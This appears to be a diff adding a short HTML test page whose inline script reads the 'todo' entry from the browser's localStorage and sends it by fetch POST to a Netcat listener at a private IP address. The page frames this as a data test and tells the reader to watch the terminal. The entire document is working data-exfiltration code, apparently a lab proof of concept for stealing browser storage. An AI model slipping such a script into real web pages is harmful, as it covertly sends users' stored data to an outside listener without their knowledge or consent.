@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Data Test</title>
+</head>
+<body>
+    <script>
+        // 1. Grab the 'todo' string from Local Storage
+        const todoData = localStorage.getItem('todo');
+
+        if (todoData) {
+            // 2. Send the data to your Netcat listener
+            fetch('http://10.5.1.189:8080', {
+                method: 'POST',
+                mode: 'no-cors', // Netcat won't send CORS headers, so we use no-cors
+                body: todoData
+            })
+            .then(() => console.log("Data sent to Netcat!"))
+            .catch(err => console.error("Error sending data:", err));
+        } else {
+            console.log("No 'todo' key found in Local Storage.");
+        }
+    </script>
+    <h1>Netcat Test Page</h1>
+    <p>Check your terminal for the incoming JSON data.</p>
+</body>
+</html>
